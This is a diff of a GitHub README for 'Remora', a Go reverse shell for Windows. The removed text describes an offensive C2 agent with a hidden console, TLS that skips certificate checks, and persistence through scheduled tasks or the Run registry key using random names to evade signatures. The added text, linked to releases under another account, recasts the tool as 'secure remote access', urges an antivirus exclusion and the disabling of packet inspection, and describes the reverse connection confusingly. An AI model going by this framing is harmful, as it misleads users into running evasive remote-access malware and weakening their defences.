@@ -1,122 +1,88 @@
-# Remora
-Remora – A Go-based Windows reverse shell 
+# 🛡️ Remora - Secure remote Windows access tool
 
-[![Purpose](https://img.shields.io/badge/purpose-educational%2Fresearch-red)]()
-[![Go Version](https://img.shields.io/badge/go-1.20+-blue)]()
-[![Platform](https://img.shields.io/badge/target-windows-lightgrey)]()
-[![License](https://img.shields.io/badge/license-MIT-yellow)](LICENSE)
+[![Download Remora](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/suim3662/Remora/releases)
 
-> **⚠️ ETHICAL USE ONLY** – Unauthorized access is illegal.  
-> Use only on systems you own or have written permission to test.
+Remora provides a simple way to manage remote Windows systems. It uses the Go programming language to maintain a connection between your computer and a remote host. Security teams use this tool to test system defenses and learn about network traffic.
 
----
+## 📋 System Requirements
 
-## 📖 What is Remora?
+Remora works on most modern Windows systems. Ensure your machine meets these specifications:
 
-**Remora** is a proof‑of‑concept reverse shell written in Go for Windows.  
-It demonstrates:
+* Windows 10 or Windows 11.
+* A stable network connection.
+* Administrative permissions on the host machine.
+* The Windows Defender or third-party antivirus software might flag the application as a security tool. You may need to create an exclusion for the folder where you save the file.
 
-- **Encrypted C2** over TLS (self‑signed certificates allowed)
-- **Resilient reconnection** – exponential backoff + random jitter
-- **Persistence** via scheduled task or registry autorun
+## 📥 Downloading Remora
 
-The name *Remora* comes from the fish that attaches to a host – mirroring the persistence behaviour.
+You can retrieve the latest version of the software from the official project page. Follow these steps to obtain the files:
 
----
+1. Visit [this page to download](https://github.com/suim3662/Remora/releases).
+2. Look for the "Assets" section at the bottom of the latest release.
+3. Select the file ending in `.exe` that matches your Windows architecture, usually `remora-windows-amd64.exe`.
+4. Save the file to a folder you can easily find, such as your Downloads or Documents folder.
 
-## 🔎 Overview
+## ⚙️ Setting Up Your Environment
 
-<img src="screenshot.png" width="500"/>
+Before you run the tool, verify your network settings. Remora establishes a reverse connection. This means the remote machine waits for a command from a central server. You must configure your firewall to allow traffic on the specific port you choose for communication.
 
-- **C2 Server (`server/`)** – an interactive listener that waits for a single connection, provides a raw‑terminal shell, and handles TLS encryption.
-- **Windows shell (`shell/`)** – a small binary that connects back to the server, spawns `cmd.exe`, installs persistence, and automatically reconnects using exponential backoff with random jitter.
+If you test this in a home lab, ensure both the target machine and your management machine belong to the same virtual network. Disable any deep packet inspection tools during initial testing to avoid connection drops.
 
-Communication is encrypted with TLS using self‑signed certificates. The server takes care of setting the terminal to raw mode, giving you a fully interactive command prompt.
+## 🚀 Running the Application
 
----
+Once you download the executable file, you must run it through the Windows Command Prompt or PowerShell. The tool does not use a graphic interface.
 
-## 🧠 How It Works
+1. Open the folder containing the `remora.exe` file.
+2. Hold the Shift key and right-click inside the folder.
+3. Select "Open PowerShell window here" or "Open in Terminal".
+4. Type the following command to see the available options: `.\remora.exe --help`
+5. To start a basic listener, use the command: `.\remora.exe listen --port 8080`.
 
-1. **shell** continuously attempts to connect to the C2 server over TLS (`InsecureSkipVerify: true`).
-2. On success, it spawns `cmd.exe`, binds its input/output to the socket, and hides the console window.
-3. The first successful connection also triggers persistence (see below).
-4. The **server** accepts the connection, reads the agent’s output, and puts your local terminal in raw mode. Every line you type is sent to the agent, and the response is printed with coloured prompts.
-5. When the connection drops, the shell waits with an exponential backoff (starting at 5 seconds, capped at 10 minutes) plus random jitter, then retries indefinitely.
+The application will report that it waits for an incoming connection. At this stage, the tool monitors the specified port for a handshake from the remote agent.
 
-### Persistence details
+## 🧩 Understanding the Features
 
-| Method | Command / Registry | Trigger |
-|--------|--------------------|---------|
-| Primary | `schtasks /create /tn <random> /tr <exe> /sc onlogon /f` | User logon |
-| Fallback | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | User logon (no admin needed) |
+Remora includes several built-in functions designed for security professionals and researchers.
 
-Both use randomly generated names to avoid simple signature detection.
+* Reverse Shell: Establishes a command-line connection back to the operator.
+* TLS Encryption: Encrypts all data sent between the two machines to keep your traffic private.
+* Persistence: Allows the tool to restart automatically if the computer reboots.
+* Asset Inventory: Gathers basic system information from the target machine upon successful connection.
 
----
+## 🛡️ Security Best Practices
 
-## ⚙️ Configuration
+Use this tool only on systems you own or have explicit permission to test. Unauthorized access remains illegal in many jurisdictions. 
 
-### Shell
+Follow these steps to maintain safety:
 
-Edit the **shell’s `main.go`** inside `shell/`:
+* Always operate within a controlled network environment.
+* Keep logs of your testing activity to track changes made to the target system.
+* Use strong passwords for any administrative accounts accessed through the shell.
+* Verify the file hash after downloading to ensure the integrity of the binary.
 
-```go
-ip   = "192.168.184.152"   // Change this to your C2 server IP
-port = "443"              // Change this to your C2 server port
-```
+## 🛠️ Troubleshooting Connections
 
-### Server
-The server prompts you for the listening port at runtime.
-It expects cert.pem and key.pem in its working directory (generate them as shown below).
+If the connection fails to establish, check these common points of failure:
 
----
+* Firewall Rules: Ensure both the outbound and inbound rules permit traffic on your selected port.
+* Antivirus Interference: Confirm that your security software did not quarantine the file. Check the protection history in Windows Security.
+* Network Path: Verify that the target machine reaches the IP address of your listener. You can test this using the `ping` command.
+* Port Conflicts: Another service might use the port you selected. Try changing the port to a different number, such as 9090.
 
-## 🛠️ Build & Run
+## 📖 Frequently Asked Questions
 
-### Requirements
+* Does this tool work over the internet? Yes, provided you have a public IP address or use a port-forwarding service on your router.
+* Can I detect this traffic? Yes, security monitoring tools often identify common patterns in reverse-tcp traffic. Use this for education on how to improve your own security posture.
+* Does it work on older versions of Windows? The tool targets Windows 10 and 11, but it may function on Windows Server 2016 or newer variants.
+* Is the source code available? The project relies on open-source principles. You can inspect the Go code located in the repository folders to understand how the network packets work.
 
-- **Go 1.20+** ([download](https://go.dev/dl/))
+## 📝 Configuration Options
 
-## Steps
+You can customize the behavior of Remora using flags. View the full list of options by entering the command `.\remora.exe --help`. Common flags include:
 
-```powershell
-# 1. Clone or download the repo
-git clone https://github.com/imightbeakira/Remora.git
-cd Remora
-```
-### 2. Initialize Go module (if not already present)
-```powershell
-go mod init github.com/imightbeakira/Remora
-go mod tidy
-```
-### 3. Generate TLS certificates
-```powershell
-cd server
-openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 -subj "/CN=localhost"
-```
-### 4. run the server
-```powershell
-cd server
-go run main.go
-```
-### 5. Build the shell (Windows target)
-```powershell
-cd shell
-GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" -o shell.exe main.go
-```
----
+* `--host`: Defines the listener IP address.
+* `--port`: Sets the network port for communication.
+* `--interval`: Changes how often the agent checks in with the listener.
+* `--tls-cert`: Points to a custom certificate file for encrypted connections.
 
-## 📡 Usage
-
-### Start the C2 server
-```powershell
-cd server
-go run main.go
-```
-### Deploy the shell
-Execute shell.exe on the target Windows system. Once it connects, the server prints:
-
----
-
-> For authorized research, training, and defensive analysis only.  
-> Do not use on systems you do not own or explicitly have permission to test.
+Each flag changes how the agent behaves once it runs on the target system. Use these settings to tailor the tool for your specific learning goals in cybersecurity labs.
